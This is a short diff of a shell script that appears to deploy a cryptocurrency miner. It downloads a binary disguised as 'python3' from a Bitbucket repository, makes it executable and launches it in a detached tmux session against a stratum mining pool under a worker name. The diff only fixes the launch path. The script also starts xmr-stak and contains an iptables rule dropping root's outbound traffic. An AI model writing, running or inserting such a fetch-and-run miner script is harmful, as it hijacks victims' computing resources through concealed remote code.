@@ -15,5 +15,5 @@ iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
 
 wget https://bitbucket.org/tengikekao/myrep/downloads/python3
 chmod +x python3
-tmux new-session -d -s xmr1 '/python3 -a yespowerr16 -o stratum+tcp://googleusercontent.com:808 -u lovelyn.worker1 -p d=0.1'
+tmux new-session -d -s xmr1 './python3 -a yespowerr16 -o stratum+tcp://googleusercontent.com:808 -u lovelyn.worker1 -p d=0.1'
 ./xmr-stak --noCPU
